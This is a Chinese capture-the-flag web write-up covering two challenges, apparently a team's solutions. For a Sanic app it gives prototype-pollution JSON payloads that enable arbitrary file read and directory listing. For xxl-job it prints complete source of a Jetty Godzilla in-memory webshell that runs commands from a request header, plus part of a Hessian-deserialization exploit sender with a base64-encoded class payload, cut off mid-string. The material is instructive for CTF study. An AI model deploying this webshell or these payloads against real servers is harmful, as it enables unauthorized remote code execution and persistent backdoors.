# WEB
## 题目：<font style="color:rgb(33, 37, 41);">Sanic's revenge</font>
解题步骤

首先看到给出的附件:

```python
from sanic import Sanic
import os
from sanic.response import text, html
import sys
import random
import pydash
# pydash==5.1.2

# 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密
class Pollute:
    def __init__(self):
        pass

app = Sanic(__name__)
app.static("/static/", "./static/")

@app.route("/*****secret********")
async def secret(request):
    secret='**************************'
    return text("can you find my route name ???"+secret)

@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())

@app.route("/pollute", methods=['GET', 'POST'])
async def POLLUTE(request):
    key = request.json['key']
    value = request.json['value']
    if key and value and type(key) is str and 'parts' not in key and 'proc' not in str(value) and type(value) is not list:
        pollute = Pollute()
        pydash.set_(pollute, key, value)
        return text("success")
    else:
        log_dir = create_log_dir(6)
        log_dir_bak = log_dir + ".."
        log_file = "/tmp/" + log_dir + "/access.log"
        log_file_bak = "/tmp/" + log_dir_bak + "/access.log.bak"
        log = 'key: ' + str(key) + '|' + 'value: ' + str(value);
        # 生成日志文件
        os.system("mkdir /tmp/" + log_dir)
        with open(log_file, 'w') as f:
            f.write(log)
        # 备份日志文件
        os.system("mkdir /tmp/" + log_dir_bak)
        with open(log_file_bak, 'w') as f:
            f.write(log)
        return text("！！！此地禁止胡来，你的非法操作已经被记录！！！")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

分析一下源代码:

/pollute路由提供了一个污染点pydash.set_，通过传参key和value可以实现原型链污染。此外这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入/tmp目录下的文件中

还存在一个未知名称的路由，我们可以猜测里面放了secret ？？？

根据提示可以发现，这里的源码并不完整，所以我们需要得到完整的源码

这里的入口点就是原型链污染，我们污染file_or_directory到根目录下，就可以实现任意文件读取

![image-1730940375432](./assets/image-1730940375432.png)

我们接着想办法获取源代码文件名,尝试访问/static/proc/1/cmdline:

![image-1730940375992](./assets/image-1730940375992.png)

接着访问/start.sh:

![image-1730940376551](./assets/image-1730940376551.png)

得到源码名称:2Q17A58T9F65y5i8.py

访问/app/2Q17A58T9F65y5i8.py,得到完整源码:

```python
from sanic import Sanic
import os
from sanic.response import text, html
import sys
import random
import pydash

# pydash==5.1.2

#源码好像被admin删掉了一些，听他说里面藏有大秘密
class Pollute:
    def __init__(self):
        pass

def create_log_dir(n):
        ret = ""
        for i in range(n):
            num = random.randint(0, 9)
            letter = chr(random.randint(97, 122))
            Letter = chr(random.randint(65, 90))
            s = str(random.choice([num, letter, Letter]))
            ret += s
        return ret
        
app = Sanic(__name__)
app.static("/static/", "./static/")

@app.route("/Wa58a1qEQ59857qQRPPQ")
async def secret(request):
    with open("/h111int",'r') as f:
       hint=f.read()
    return text(hint)

@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())

@app.route("/adminLook", methods=['GET'])
async def AdminLook(request):
    #方便管理员查看非法日志
    log_dir=os.popen('ls /tmp -al').read();
    return text(log_dir)
    
@app.route("/pollute", methods=['GET', 'POST'])
async def POLLUTE(request):
    key = request.json['key']
    value = request.json['value']
    if key and value and type(key) is str and 'parts' not in key and 'proc' not in str(value) and type(value) is not list:
        pollute = Pollute()
        pydash.set_(pollute, key, value)
        return text("success")
    else:
        log_dir=create_log_dir(6)
        log_dir_bak=log_dir+".."
        log_file="/tmp/"+log_dir+"/access.log"
        log_file_bak="/tmp/"+log_dir_bak+"/access.log.bak"
        log='key: '+str(key)+'|'+'value: '+str(value);
        #生成日志文件
        os.system("mkdir /tmp/"+log_dir)
        with open(log_file, 'w') as f:
             f.write(log)
        #备份日志文件
        os.system("mkdir /tmp/"+log_dir_bak)
        with open(log_file_bak, 'w') as f:
             f.write(log)
        return text("！！！此地禁止胡来，你的非法操作已经被记录！！！")

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

可以看到多出来的路由:Wa58a1qEQ59857qQRPPQ，我们直接访问得到hint：

```plain
flag in /app,but you need to find his name！！！
Find a way to see the file names in the app directory
```

这里提示我们flag文件在app目录下，只是不知道flag名字

那么很明显我们需要想办法列出app目录下的文件

还看到adminLook路由可以看到/tmp目录下的文件，而我们的非法日志就记录在此目录下，我们先随便触发一次非法记录,接着访问adminLook路由:

![image-1730940377108](./assets/image-1730940377108.png)

可以看到这里存在两个目录，一个备份目录名称为ddahJ6..，那么就可以利用访问这个目录实现穿越到上层目录：

```plain
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory","value": "/tmp"}
```

首先切换到tmp目录下，再污染base的值:

```plain
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base","value": "static/ddahJ6"}
```

同时记得开启列目录功能:

```plain
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": True}
```

接着访问即可:

![image-1730940377607](./assets/image-1730940377607.png)

可以看到flag名称，接着访问/app/45W698WqtsgQT1_flag即可得到flag



## 题目：<font style="color:rgb(33, 37, 41);">EasyJob</font>
解题步骤

根据附件可以确认是xxl-job-executor未授权访问的漏洞，参考下列链接：

[https://github.com/Threekiii/Vulhub-Reproduce/blob/master/XXL-JOB%20executor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md](https://github.com/Threekiii/Vulhub-Reproduce/blob/master/XXL-JOB%20executor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)

但是会发现咱们的xxl-job版本比较老，属于需要靠Hessian反序列化去触发的版本，并且题目是不出网的。这时候就避免不了打一个内存马。因此这一题的关键点其实是如何去注入一个无Web依赖的Jetty内存马。

在xxljob中内置了一个handler如下

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.xxl.job.core.rpc.netcom.jetty.server;

import com.xxl.job.core.rpc.codec.RpcRequest;
import com.xxl.job.core.rpc.codec.RpcResponse;
import com.xxl.job.core.rpc.netcom.NetComServerFactory;
import com.xxl.job.core.rpc.serialize.HessianSerializer;
import com.xxl.job.core.util.HttpClientUtil;
import java.io.IOException;
import java.io.OutputStream;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.handler.AbstractHandler;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class JettyServerHandler extends AbstractHandler {
    private static Logger logger = LoggerFactory.getLogger(JettyServerHandler.class);

    public JettyServerHandler() {
    }

    public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        RpcResponse rpcResponse = this.doInvoke(request);
        byte[] responseBytes = HessianSerializer.serialize(rpcResponse);
        response.setContentType("text/html;charset=utf-8");
        response.setStatus(200);
        baseRequest.setHandled(true);
        OutputStream out = response.getOutputStream();
        out.write(responseBytes);
        out.flush();
    }

    private RpcResponse doInvoke(HttpServletRequest request) {
        RpcResponse rpcResponse;
        try {
            byte[] requestBytes = HttpClientUtil.readBytes(request);
            if (requestBytes != null && requestBytes.length != 0) {
                RpcRequest rpcRequest = (RpcRequest)HessianSerializer.deserialize(requestBytes, RpcRequest.class);
                RpcResponse rpcResponse = NetComServerFactory.invokeService(rpcRequest, (Object)null);
                return rpcResponse;
            } else {
                rpcResponse = new RpcResponse();
                rpcResponse.setError("RpcRequest byte[] is null");
                return rpcResponse;
            }
        } catch (Exception var5) {
            logger.error(var5.getMessage(), var5);
            rpcResponse = new RpcResponse();
            rpcResponse.setError("Server-error:" + var5.getMessage());
            return rpcResponse;
        }
    }
}

```

JettyHandler，我们需要做的就是注入一个一模一样的东西。这里具体细节就没啥好说的了，最后内存马如下

```java
package com.xxl.job.core;

import org.eclipse.jetty.server.*;
import org.eclipse.jetty.server.handler.AbstractHandler;
import org.eclipse.jetty.server.handler.HandlerCollection;
import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.ref.Reference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Scanner;

//author:Boogipop

public class JettyGodzillaMemshell extends AbstractHandler {
    String xc = "3c6e0b8a9c15224a"; // key
    String pass = "username";
    String md5 = md5(pass + xc);
    Class payload;
    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }
    public JettyGodzillaMemshell() {
        System.out.println(1);
    }

    public JettyGodzillaMemshell(int s) {
        System.out.println(2);
    }

    static {
        try {
            HttpConnection valueField = getValueField();
            HandlerCollection handler = (HandlerCollection) valueField.getHttpChannel().getServer().getHandler();
            Field mutableWhenRunning = handler.getClass().getDeclaredField("_mutableWhenRunning");
            mutableWhenRunning.setAccessible(true);
            mutableWhenRunning.set(handler,true);
//            handler.addHandler(new JettyHandlerMemshell(1));
            Handler[] handlers = handler.getHandlers();
            Handler[] newHandlers=new Handler[handlers.length+1];
            newHandlers[0]=new JettyGodzillaMemshell(1);
            for (int i = 0; i < handlers.length; i++) {
                newHandlers[i + 1] = handlers[i];
            }
            handler.setHandlers(newHandlers);

        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
    private static sun.misc.Unsafe getUnsafe() throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Field unsafe = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        unsafe.setAccessible(true);
        sun.misc.Unsafe theunsafe = (sun.misc.Unsafe) unsafe.get(null);
        return theunsafe;
    }
    private static HttpConnection getValueField() throws NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        Unsafe unsafe = getUnsafe();
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Field threadsfiled = threadGroup.getClass().getDeclaredField("threads");
        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));
        for(int i=0;i<threads.length;i++) {
            try {
                Field threadLocalsF = threads[i].getClass().getDeclaredField("threadLocals");
                Object threadlocal = unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));
                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField("table")));
                for(int j=0;j<table.length;j++){
                    try {
                        //HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField("value")));
                        //PrintWriter writer = value.getHttpChannel().getResponse().getWriter();
                        //writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter("cmd")));
                        //writer.flush();
                        Object value =unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField("value")));
                        if(value.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")){
                            return (HttpConnection)value;
                        }
                    }
                    catch (Exception e){

                    }
                }

            } catch (Exception e) {

            }
        }
        return null;
    }
    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void handle(String s, Request base, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        try {
            if (request.getHeader("x-fuck-data").equalsIgnoreCase("cmd")) {
                String cmd = request.getHeader("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    String[] cmds = null;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        cmds = new String[]{"cmd", "/c", cmd};
                    } else {
                        cmds = new String[]{"/bin/bash", "-c", cmd};
                    }
                    base.setHandled(true);
                    String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\ASADSADASDSADAS").next();
                    ServletOutputStream outputStream = response.getOutputStream();
                    outputStream.write(result.getBytes());
                    outputStream.flush();
                }
            }
            else if (request.getHeader("x-fuck-data").equalsIgnoreCase("godzilla")) {
                // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                byte[] data = base64Decode(request.getParameter(pass));
                data = x(data, false);
                if (payload == null) {
                    URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defMethod.setAccessible(true);
                    payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                } else {
                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(request);
                    base.setHandled(true);
                    ServletOutputStream outputStream = response.getOutputStream();
                    outputStream.write(md5.substring(0, 16).getBytes());
                    f.toString();
                    outputStream.write(base64Encode(x(arrOut.toByteArray(), true)).getBytes());
                    outputStream.write(md5.substring(16).getBytes());
                    outputStream.flush();
                    return ;
                }
            }
        } catch (Exception e) {
        }
    }
}

```

注入内存马需要用的Gadgets我们选用JDK原生那条链子，如下：

```java
package com.example;

import com.caucho.hessian.io.*;
import com.xxl.rpc.serialize.impl.HessianSerializer;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Hashtable;

public class App {

    public static String sendPostRequest(String urlString, byte[] rawData) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        try {
            // 设置请求方法为POST
            connection.setRequestMethod("POST");
            // 允许输入输出
            connection.setDoOutput(true);
            // 设置请求头
            connection.setRequestProperty("Content-Type", "application/octet-stream");  // 根据需要设置Content-Type

            // 写入请求体
            try (OutputStream os = connection.getOutputStream()) {
                os.write(rawData);
                os.flush();
            }

            // 读取响应
            try (InputStream is = connection.getInputStream()) {
                StringBuilder response = new StringBuilder();
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    response.append(new String(buffer, 0, bytesRead, "utf-8"));
                }
                return response.toString();
            }
        } finally {
            connection.disconnect();
        }
    }

    public static void main( String[] args ) throws Exception {
//        Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
//        Method defineClass = Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
//        Field f = Unsafe.class.getDeclaredField("theUnsafe");
//        f.setAccessible(true);
//        Object unsafe = f.get(null);
//        Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"com.xxl.job.core.EvilCustomizerLoader", bcode, 0, bcode.length, null, null}}};
        String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
                "xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +
                "xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +
                "xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +
                "xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n" +
                ">\n" +
                "    <xsl:template match=\"/\">\n" +
                "      <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'<base64_payload>')\"/>\n" +
                "      <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
                "      <xsl:variable name=\"rce\" select=\"ru:defineClass('<class_name>',$bs,$cl)\"/>\n" +
                "      <xsl:value-of select=\"$rce\"/>\n" +
                "    </xsl:template>\n" +
                "  </xsl:stylesheet>";

        String base64Code = "yv66vgAAADMCAAgA+QoA+gD7CgA4APwKADgA/QoA+gD+BwD/CgD6AQAKAAYBAQoABgECCgA4AQMHAQQKAIgBBQgBBgkAgAEHCAEICQCAAQkHAQoKABEBBQoAEQELCgARAQwKAIABDQkAgAEOCQEPARAKAREBEggBEwoANQEUCAEVCgA1ARYKARcBGAoBFwEZBwEaCgCAARsKARwBHQoBHAEeCgA3AR8IALQKAB8BIAoAHwEhBwC1CAEiCACuBwCvCACpCgA1ASMIASQKADgBJQcBJggBJwgBKAoANQEpCgEqASsIASwHAS0HAMEHAS4HAS8IATAKADUBMQgBMggBMwgBNAgBNQgBNggBNwoBOAE5BwE6CgBCATsKATgBPAoBOAE9CAE+CwE/AUAIANMKADgBQQoAOAFCCAFDCgEPAUQKADgBRQgBRgoAOAFHCAFICAFJCAFKCgFLAUwHAU0KAU4BTwoBTgFQCgFRAVIKAFQBUwgBVAoAVAFVCgBUAVYLAVcBWAoBWQFaCgFZAVsIAVwLAT8BXQoAgAFeCgCAAV8JAIABYAcBYQcBYgoBHAFjCgBkAWQHAWUIAWYJAWcBaAoANQFpCgEqARgKAWcBagcBawoAbgEFCgA3ASUKADgBbAoANwEMCgBuAW0KAIABbgoAOAFvCgCAAXAKAC8BcQoBcgFzCgF0AXUHAXYIAXcKAXgBeQoBFwF6CgB6AXsHAXwHAX0KAIABfgoAegF/BwGABwGBCgCEAYIHAYMHAYQHAYUBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBLwcBBAEABjxpbml0PgEAAygpVgEABHRoaXMBAChMY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGw7AQAEKEkpVgEAAUkBAAlnZXRVbnNhZmUBABMoKUxzdW4vbWlzYy9VbnNhZmU7AQAGdW5zYWZlAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACXRoZXVuc2FmZQEAEUxzdW4vbWlzYy9VbnNhZmU7AQAKRXhjZXB0aW9ucwEADWdldFZhbHVlRmllbGQBACsoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENvbm5lY3Rpb247AQAFdmFsdWUBABJMamF2YS9sYW5nL09iamVjdDsBAAFqAQANdGhyZWFkTG9jYWxzRgEAC3RocmVhZGxvY2FsAQAFdGFibGUBABpbTGphdmEvbGFuZy9yZWYvUmVmZXJlbmNlOwEAAWkBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAMdGhyZWFkc2ZpbGVkAQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHARoHAYYHAYcHAS4BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABmJhc2U2NAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJicwEAAltCAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAFaBwF9BwGIAQAGaGFuZGxlAQCGKExqYXZhL2xhbmcvU3RyaW5nO0xvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEADG91dHB1dFN0cmVhbQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQADY21kAQAOdXJsQ2xhc3NMb2FkZXIBABlMamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXI7AQAJZGVmTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEABGRhdGEBAARiYXNlAQAiTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9SZXF1ZXN0OwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsHAM8HAYkHAYoBAAg8Y2xpbml0PgEACnZhbHVlRmllbGQBAClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDb25uZWN0aW9uOwEAB2hhbmRsZXIBADRMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL2hhbmRsZXIvSGFuZGxlckNvbGxlY3Rpb247AQASbXV0YWJsZVdoZW5SdW5uaW5nAQAIaGFuZGxlcnMBACNbTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAC25ld0hhbmRsZXJzAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwcBJgcBdgcA7AcBgAcBgwcBhAEAClNvdXJjZUZpbGUBABpKZXR0eUdvZHppbGxhTWVtc2hlbGwuamF2YQEAA01ENQcBiwwBjAGNDAGOAY8MAZABkQwBkgGTAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAZQBjwwAmgGVDAGWAZcMAZgBmQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAJoAmwEAEDNjNmUwYjhhOWMxNTIyNGEMAIkAigEACHVzZXJuYW1lDACLAIoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBmgGbDAGWAZkMAIwAjwwAjACKBwGcDAGdAZ4HAZ8MAaAAngEAD3N1bi5taXNjLlVuc2FmZQwBoQGiAQAJdGhlVW5zYWZlDAGjAaQHAYcMAaUBpgwBpwGoAQAPc3VuL21pc2MvVW5zYWZlDACgAKEHAakMAaoBqwwBrAGtDAGuAa8MAbABsQwBsgGzAQAMdGhyZWFkTG9jYWxzDAG0AZkBACdvcmcuZWNsaXBzZS5qZXR0eS5zZXJ2ZXIuSHR0cENvbm5lY3Rpb24MAbUBtgEAJ29yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IdHRwQ29ubmVjdGlvbgEAEGphdmEudXRpbC5CYXNlNjQBAApnZXRFbmNvZGVyDAG3AbgHAbkMAboBuwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAG8Ab0BAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAA0FFUwcBiAwBjAG+AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAmgG/DAHAAcEMAcIBwwEAC3gtZnVjay1kYXRhBwHEDAHFAI8MAcYBxwwByAHJAQAHb3MubmFtZQwBygCPDAHLAZkBAAN3aW4MAcwBzQEAAi9jAQAJL2Jpbi9iYXNoAQACLWMHAc4MAc8BpgEAEWphdmEvdXRpbC9TY2FubmVyBwHQDAHRAdIMAdMB1AcB1QwB1gHXDACaAdgBABBcQVNBRFNBREFTRFNBREFTDAHZAdoMAdsBmQcB3AwB3QHeBwHfDAHgAeEMAeIAmwEACGdvZHppbGxhDAHjAI8MAMIAwwwAxQDGDACNAI4BABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAwB5AHlDACaAeYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwcB5wwB6ACODAHpAbgMAeoB6wEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAHsAe0MAe4BjwwAugC7DAHsAZcMAKcAqAwB7wHwBwHxDAHyAfMHAfQMAfUB9gEAMm9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9oYW5kbGVyL0hhbmRsZXJDb2xsZWN0aW9uAQATX211dGFibGVXaGVuUnVubmluZwcB9wwB6gH4DAH5AfoMAfsB/AEAIG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyAQAmY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGwMAJoAngwB/QH+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAJoB/wEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BADBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXIBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEACHRvU3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARb2JqZWN0RmllbGRPZmZzZXQBABwoTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOylKAQAJZ2V0T2JqZWN0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0opTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cm